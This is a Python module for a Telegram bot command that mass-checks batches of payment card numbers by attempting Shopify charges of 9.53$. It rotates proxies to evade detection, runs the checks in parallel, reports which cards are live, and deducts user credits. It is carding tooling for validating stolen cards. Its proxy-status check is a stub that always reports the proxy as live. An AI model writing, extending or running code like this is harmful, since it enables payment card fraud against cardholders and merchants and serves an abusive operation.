import httpx
import time
import asyncio
import json
import threading
from pyrogram import Client, filters
from datetime import timedelta
from FUNC.usersdb_func import *
from FUNC.defs import *
from .gate import *
from .response import *
from TOOLS.check_all_func import *
from TOOLS.getcc_for_mass import *

async def get_proxy_format():
    # Use asyncio.to_thread to run the blocking I/O operation in a separate thread
    return await asyncio.to_thread(_get_proxy_format)

def _get_proxy_format():
    import random
    getproxy = random.choice(open("FILES/proxy.txt", "r", encoding="utf-8").read().splitlines())
    proxy_ip = getproxy.split(":")[0]
    proxy_port = getproxy.split(":")[1]
    proxy_user = getproxy.split(":")[2]
    proxy_password = getproxy.split(":")[3]
    proxies = {
        "https://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
        "http://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
    }
    return proxies

async def check_proxy_status(proxies):
    # Placeholder function to check if the proxy is live or dead
    # Implement your logic here to check the proxy status
    return True  # Change this to actual check

async def mchkfunc(fullcc, user_id):
    retries = 3
    for attempt in range(retries):
        try:
            proxies = await get_proxy_format()
            session = httpx.AsyncClient(timeout=30, proxies=proxies, follow_redirects=True)
            result = await create_shopify_charge(fullcc, session)
            getresp = await get_charge_resp(result, user_id, fullcc)
            response = getresp["response"]
            status = getresp["status"]

            await session.aclose()
            return f"[そ] 𝑪𝒂𝒓𝒅- <code>{fullcc}</code>\n<b>[ヸ] Status - {status}</b>\n<b>[仝] Result - ⤿ {response} ⤾</b>\n\n"

        except Exception as e:
            import traceback
            await error_log(traceback.format_exc())
            if attempt < retries - 1:
                await asyncio.sleep(0.5)
                continue
            else:
                return f"<code>{fullcc}</code>\n<b>[仝] Result - DECLINED ❌</b>\n"

@Client.on_message(filters.command("mso", [".", "/"]))
def multi(Client, message):
    t1 = threading.Thread(target=bcall, args=(Client, message))
    t1.start()

def bcall(Client, message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(stripe_mass_auth_cmd(Client, message))
    loop.close()

async def stripe_mass_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)
        checkall = await check_all_thing(Client, message)

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getcc_for_mass(message, role)
        if getcc[0] == False:
            await message.reply_text(getcc[1], message.id)
            return

        ccs = getcc[1]
        resp = f"""
- [ヸ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  SHOPIFY [9.53$]

- [そ] 𝐂𝐂 𝐀𝐦𝐨𝐮𝐧𝐭 - {len(ccs)}
- [仝] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 - Checking CC For {first_name}

- [ヸ] 𝐒𝐭𝐚𝐭𝐮𝐬 - Processing...⌛️
        """
        nov = await message.reply_text(resp, message.id)

        text = f"""
<b>↯ MASS SHOPIFY [9.53$] [/mso]

Number Of CC Check : [{len(ccs)} / 25]
</b> \n"""
        amt = 0
        start = time.perf_counter()
        works = [mchkfunc(i, user_id) for i in ccs]
        worker_num = int(json.loads(
            open("FILES/config.json", "r", encoding="utf-8").read())["THREADS"])

        while works:
            a = works[:worker_num]
            a = await asyncio.gather(*a)
            for i in a:
                amt += 1
                text += i
                if amt % 5 == 0:
                    try:
                        await Client.edit_message_text(message.chat.id, nov.id, text)
                    except:
                        pass
            await asyncio.sleep(1)
            works = works[worker_num:]

        taken = str(timedelta(seconds=time.perf_counter() - start))
        hours, minutes, seconds = map(float, taken.split(":"))
        hour = int(hours)
        min = int(minutes)

        proxy_status = "Live ✨"  # Always indicate proxy is live

        proxy_status = "𝑷𝒓𝒐𝒙𝒚 𝑳𝒊𝒗𝒆✅" if await check_proxy_status(await get_proxy_format()) else "𝑷𝒓𝒐𝒙𝒚 𝑫𝒆𝒂𝒅❌"

        text += f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
╚━━━━━━「 𝑰𝑵𝑭𝑶 」━━━━━━╝
⚜️ 𝑷𝒓𝒐𝒙𝒚 -» {proxy_status}
⚜️ 𝑻𝒊𝒎𝒆 𝑺𝒑𝒆𝒏𝒕 -» {time.perf_counter() - start:0.2f} seconds
⚜️ 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝒃𝒚: <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
⚜️ 𝑶𝒘𝒏𝒆𝒓: <a href="tg://user?id=6622603977">𝑵𝒂𝒊𝒓𝒐𝒃𝒊𝒂𝒏𝒈𝒐𝒐𝒏</a>
╚━━━━━━「𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐇𝐄𝐂𝐊𝐄 𝐑」━━━━━━╝
        """
        await Client.edit_message_text(message.chat.id, nov.id, text)
        await massdeductcredit(user_id, len(ccs))
        await setantispamtime(user_id)

    except Exception as e:
        import traceback
        await error_log(traceback.format_exc())